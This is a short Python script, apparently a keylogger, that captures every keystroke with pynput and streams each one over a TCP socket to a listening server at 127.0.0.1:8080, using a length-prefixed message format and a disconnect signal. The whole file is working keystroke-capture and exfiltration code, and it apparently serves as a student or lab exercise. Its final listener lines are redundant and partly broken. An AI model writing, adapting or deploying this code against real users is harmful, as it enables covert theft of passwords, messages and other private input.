#!/usr/bin/env python3
from pynput import keyboard
import os
import json
import requests
import socket
import sys

HEADER = 64
PORT = 8080
FORMAT = 'utf-8'
DISCONNECT_KEY = "!DISCONNECT"
SERVER = "127.0.0.1"
ADDR = (SERVER, PORT)

# socket initiation
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg):
    message = msg.encode(FORMAT)
    msg_len = len(message)
    send_len = str(msg_len).encode(FORMAT)
    send_len += b' ' * (HEADER - len(send_len))
    client.send(send_len)
    client.send(message)

def on_key_strokes(key):
    key_pressed = str(key).strip("'") 
    send(key_pressed)

try: 
    with keyboard.Listener(
        on_press=on_key_strokes,
    ) as listener:
        listener.join()

    listener = keyboard.Listener(
        on_press=on_key_strokes,
    ).join()

    listener.start()
except KeyboardInterrupt: 
    send(DISCONNECT_KEY)
    print("\t exiting .. ")


